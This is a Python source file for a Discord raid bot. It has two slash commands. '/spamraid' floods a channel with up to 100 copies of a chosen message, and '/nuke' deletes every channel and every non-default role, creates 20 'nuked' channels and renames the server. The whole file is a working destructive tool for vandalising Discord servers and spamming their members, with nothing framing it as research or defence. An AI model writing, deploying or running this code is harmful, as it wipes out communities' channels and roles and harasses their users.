import discord
from discord.ext import commands
from discord import app_commands
import os
import json
import asyncio
from colorama import init, Fore, Style

init(autoreset=True)

def save_token(token):
    with open("token.json", "w") as file:
        json.dump({"TOKEN": token}, file)

def load_token():
    try:
        with open("token.json", "r") as file:
            data = json.load(file)
            return data.get("TOKEN")
    except FileNotFoundError:
        print(Fore.RED + "Error: token.json not found.")
        return None
    except json.JSONDecodeError:
        print(Fore.RED + "Error: Invalid JSON format in token.json.")
        return None

def display_logo():
    logo = r'''
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░       ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓███████▓▒░ ░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░            ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░            ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓███████▓▒░   ░▒▓█▓▒░             ░▒▓██▓▒░  ░▒▓█▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
'''
    os.system('cls' if os.name == 'nt' else 'clear')  
    print(Fore.BLUE + logo)

def display_status(connected):
    if connected:
        print(Fore.GREEN + "Status: Connected")
    else:
        print(Fore.RED + "Status: Disconnected")

def token_management():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "Welcome to the bot token management!\n")
    print("1. Set new token")
    print("2. Load previous token")
    print()
    choice = input(Fore.YELLOW + "Choose an option (1, 2): ")

    if choice == "1":
        new_token = input(Fore.GREEN + "Enter the new token: ")
        save_token(new_token)
        print(Fore.GREEN + "Token successfully set!")
        return new_token
    elif choice == "2":
        token = load_token()
        if token:
            print(Fore.GREEN + f"Previous token loaded: {token}")
            return token
        else:
            print(Fore.RED + "No token found.")
            return None
    else:
        print(Fore.RED + "Invalid choice. Please try again.")
        return None

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

class SpamButton(discord.ui.View):
    def __init__(self, message, spam_count=50):
        super().__init__(timeout=None)
        self.message = message
        self.spam_count = spam_count

    @discord.ui.button(label="Spam", style=discord.ButtonStyle.red)
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        for i in range(self.spam_count):
            try:
                await interaction.followup.send(f"{self.message} [{i+1}/{self.spam_count}]", ephemeral=False)
                await asyncio.sleep(0.5)
            except Exception as e:
                print(Fore.RED + f"Error during spam: {e}")
                break

@bot.tree.command(name="spamraid", description="Send a message and generate a button to spam")
@app_commands.describe(
    message="The message you want to spam",
    count="Number of times to spam (default: 50, max: 100)"
)
async def spamraid(interaction: discord.Interaction, message: str, count: int = 50):
    if count > 100:
        count = 100
    view = SpamButton(message, count)
    await interaction.response.send_message(
        f"💥 SPAM TEXT 💥\nMessage: {message}\nCount: {count}",
        view=view,
        ephemeral=True
    )

@bot.tree.command(name="nuke", description="Nuke the server (admin only)")
async def nuke(interaction: discord.Interaction):
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ You need administrator permissions to use this command!", ephemeral=True)
    
    await interaction.response.defer()
    
    guild = interaction.guild
    
    # Delete all channels
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.5)
        except Exception as e:
            print(Fore.YELLOW + f"Couldn't delete channel {channel.name}: {e}")
    
    # Delete all roles
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
                await asyncio.sleep(0.5)
        except Exception as e:
            print(Fore.YELLOW + f"Couldn't delete role {role.name}: {e}")
    
    # Create spam channels
    for i in range(20):
        try:
            await guild.create_text_channel(f"nuked-{i+1}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(Fore.YELLOW + f"Couldn't create channel: {e}")
    
    # Change server name and icon
    try:
        await guild.edit(name="💀 NUKED SERVER 💀")
    except Exception as e:
        print(Fore.YELLOW + f"Couldn't change server name: {e}")
    
    await interaction.followup.send("☢️ Server has been nuked! ☢️")

@bot.event
async def on_ready():
    display_logo()
    display_status(True)
    print("Connected as " + Fore.YELLOW + f"{bot.user}")

    try:
        await bot.tree.sync()
        print(Fore.GREEN + "Commands successfully synchronized.")
    except Exception as e:
        display_status(False)
        print(Fore.RED + f"Error during synchronization: {e}")

if __name__ == "__main__":
    TOKEN = token_management()
    if TOKEN:
        try:
            bot.run(TOKEN)
        except discord.errors.LoginFailure:
            print(Fore.RED + "Can't connect to token. Please check your token.")
            input(Fore.YELLOW + "Press Enter to go back to the menu...")
            TOKEN = token_management()
            if TOKEN:
                bot.run(TOKEN)
        except Exception as e:
            print(Fore.RED + f"An unexpected error occurred: {e}")
            input(Fore.YELLOW + "Press Enter to restart the menu...")
            TOKEN = token_management()
            if TOKEN:
                bot.run(TOKEN)
    else:
        print(Fore.RED + "❌ Error: Unable to load or set a token.")
